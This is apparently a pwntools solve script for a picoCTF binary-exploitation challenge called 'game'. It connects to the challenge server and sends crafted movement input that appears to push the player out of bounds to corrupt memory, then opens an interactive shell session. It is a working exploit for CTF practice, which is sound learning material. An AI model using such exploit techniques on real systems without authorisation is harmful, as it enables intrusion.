#!/usr/bin/env python3
from pwn import *

exe = ELF("./game")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 63908)

    return r
context.binary = exe
def main():
	r = conn()
	r.recvuntil(b'X')
	r.sendline(b'lo')
	r.sendline(b'd'*(51-4)+ b'w'*(4 + 1))
	r.interactive()

if __name__ == "__main__":
    main()